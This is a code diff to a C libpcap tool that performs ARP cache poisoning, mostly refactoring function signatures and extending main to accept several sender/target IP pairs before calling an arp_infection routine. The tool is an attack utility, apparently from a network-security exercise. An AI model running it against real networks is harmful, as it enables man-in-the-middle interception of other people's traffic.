@@ -24,7 +24,13 @@
 #define ARP_DATA    sizeof(struct _arp_data)
 #define PACKET_SIZE 256
 
-int send_arp(pcap_t *handle, pether_hdr peh, parp_hdr pah, parp_data pad) {
+int 
+send_arp (
+	pcap_t *handle, 
+	pether_hdr peh, 
+	parp_hdr pah, 
+	parp_data pad
+) {
     u_char packet[PACKET_SIZE] = {0, };
 
     memcpy(packet, peh, ETHER_SIZE);
@@ -44,7 +50,11 @@ int send_arp(pcap_t *handle, pether_hdr peh, parp_hdr pah, parp_data pad) {
  *  receive a arp reply packet
  */
 
-int recv_arp(pcap_t *handle, char* tmac) {
+int 
+recv_arp (
+	pcap_t *handle, 
+	byte* tmac
+) {
     struct pcap_pkthdr header;        /* The header that pcap gives us */
     const u_char *packet;             /* The actual packet */
 
@@ -72,7 +82,14 @@ int recv_arp(pcap_t *handle, char* tmac) {
  *  return : true(1), false(0)
  *  normal arp request & reply
  */
-int normal_arp(pcap_t *handle, const char* smac, const char* sip, char* tmac, const char* tip) {
+int 
+normal_arp (
+	pcap_t *handle, 
+	const byte* smac, 
+	const byte* sip, 
+	BYTE* tmac, 
+	const byte* tip
+) {
     ether_hdr eh;			/* Ethernet Header */
     arp_hdr ah;				/* ARP Header */
     arp_data ad;			/* ARP Data */
@@ -96,7 +113,7 @@ int normal_arp(pcap_t *handle, const char* smac, const char* sip, char* tmac, co
     ad.target_ip = inet_addr(tip);
 
     send_arp(handle, &eh, &ah, &ad);
-    if(!recv_arp(handle, tmac)) return 1;
+    if(!recv_arp(handle, (byte*)tmac)) return 1;
 
     return 0;
 }
@@ -107,7 +124,14 @@ int normal_arp(pcap_t *handle, const char* smac, const char* sip, char* tmac, co
  *  return : X
  *  infect arp request
  */
-void arp_infection(pcap_t *handle, const char* my_mac, const char* tip, const char* smac, const char* sip) {
+void 
+arp_infection (
+	pcap_t *handle, 
+	const byte* my_mac, 
+	const byte* tip, 
+	const byte* smac, 
+	const byte* sip
+) {
     ether_hdr eh;			/* Ethernet Header */
     arp_hdr ah;				/* ARP Header */
     arp_data ad;			/* ARP Data */
@@ -143,8 +167,12 @@ void arp_infection(pcap_t *handle, const char* my_mac, const char* tip, const ch
  *  return : X
  *  Convert 6 bytes address to MAC Address string
  */
-void convrt_mac( const char *data, char *cvrt_str, int sz )
-{
+void 
+convrt_mac ( 
+	const byte *data, 
+	byte *cvrt_str, 
+	int sz 
+) {
     char buf[ETHER_ADDRSTRLEN] = {0, };
     char t_buf[8];
     char *stp = strtok( (char *)data , ":" );
@@ -169,8 +197,10 @@ void convrt_mac( const char *data, char *cvrt_str, int sz )
  */
 #define REQ_CNT 20
 
-int get_my_mac(char* mac_adr, char* ip_adr) 
-{
+int 
+get_my_mac (
+	p_addr_list my_al
+) {
     int sockfd, cnt, req_cnt = REQ_CNT;
     struct sockaddr_in *sock;
     struct ifconf ifcnf_s;
@@ -203,20 +233,19 @@ int get_my_mac(char* mac_adr, char* ip_adr)
 	if( ifr_s->ifr_flags & IFF_LOOPBACK )
             continue;
 	sock = (struct sockaddr_in *)&ifr_s->ifr_addr;
-	memcpy(ip_adr, inet_ntoa(sock->sin_addr), INET_ADDRSTRLEN);
+	memcpy(my_al->ip, inet_ntoa(sock->sin_addr), INET_ADDRSTRLEN);
         if( ioctl( sockfd, SIOCGIFHWADDR, ifr_s ) < 0 ) {
             perror( "ioctl() - SIOCGIFHWADDR" );
             return -1;
         }
-        convrt_mac(ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), mac_adr, 63);
-	printf("My IP Address : %s\n", ip_adr);
-	printf("My MAC Address : %s\n", mac_adr);
+        convrt_mac((const char*)ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), (char*)my_al->mac, ETHER_ADDRSTRLEN);
+	printf("My IP Address : %s\n", my_al->ip);
+	printf("My MAC Address : %s\n", my_al->mac);
     }
 
     free(ifcnf_s.ifc_buf);
     return 0;
 }
-
 
 /*
  *  main
@@ -227,26 +256,39 @@ int get_my_mac(char* mac_adr, char* ip_adr)
 #define NONPROMISC  0
 #define TIME_OUT    1000
 
-int main(int argc, char *argv[]) {
+int 
+main (
+	int argc, 
+	char *argv[]
+) {
     pcap_t *handle;			/* Session Handle */
     char *dev;				/* Interface */
-    char *sip;				/* Sender IP */
-    char *tip;				/* Target IP */
-    char smac[ETHER_ADDRSTRLEN] = {0, };/* Sender MAC */
-    //char tmac[ETHER_ADDRSTRLEN] = {0, };/* Target MAC */
-    char my_mac[ETHER_ADDRSTRLEN] = {0, };/* My MAC */
-    char my_ip[INET_ADDRSTRLEN] = {0, };/* My IP */
+    DWORD gen_num;			/* Generated Number */
+    p_addr_list s_al;			/* Sender's Linked List */
+    p_addr_list t_al;			/* Target's Linked List */
+    addr_list my_al;			/* My Linked List */
     char errbuf[PCAP_ERRBUF_SIZE];	/* Error String */
 
-    if(argc!=4) {
-        fprintf(stderr, "Usage : %s <interface> <sender ip> <target ip>\n", argv[0]);
+    if((argc <= 4) && ((argc%2) != 0)) {
+        fprintf(stderr, "Usage : %s <interface> <sender ip> <target ip> [<sender ip> <target ip>...]\n", argv[0]);
         return(2);
     }
-    dev = argv[1];
-    sip = argv[2];
-    tip = argv[3];
 
-    get_my_mac(my_mac, my_ip);
+    gen_num = (argc/2)-1;
+
+    s_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
+    memset(s_al, 0, sizeof(addr_list)*gen_num);
+    for(DWORD i=0; i<gen_num; i++)
+	strncpy((char *__restrict)s_al[i].ip, argv[2+(i*2)], INET_ADDRSTRLEN);
+
+    t_al = (p_addr_list) malloc(sizeof(addr_list)*gen_num);
+    memset(t_al, 0, sizeof(addr_list)*gen_num);
+    for(DWORD i=0; i<gen_num; i++)
+	strncpy((char *__restrict)t_al[i].ip, argv[(i*2)+3], INET_ADDRSTRLEN);
+    
+    dev = argv[1];
+
+    get_my_mac(&my_al);
 
     /* Nonpromiscuous mode */
     handle = pcap_open_live(dev, BUFSIZ, PROMISC, TIME_OUT, errbuf);
@@ -256,12 +298,21 @@ int main(int argc, char *argv[]) {
     }
 
     // Get Sender's MAC Address
-    if(normal_arp(handle, my_mac, my_ip, smac, sip)) {
+    if(normal_arp(handle, 
+		(const byte*)my_al.mac, 
+		(const byte*)my_al.ip, 
+		s_al[0].mac, 
+		(const byte*)s_al[0].ip)) 
+    {
 	puts("===== ARP Request Result ====");
-	printf("Sender's MAC Address : %s\n", smac);
+	printf("Sender's MAC Address : %s\n", s_al[0].mac);
 	puts("=============================");
 
-	arp_infection(handle, my_mac, tip, smac, sip);
+	arp_infection(handle, 
+		(const byte*)my_al.mac, 
+		(const byte*)t_al[0].ip, 
+		(const byte*)s_al[0].mac, 
+		(const byte*)s_al[0].ip);
     }
 
     /* And close the session */
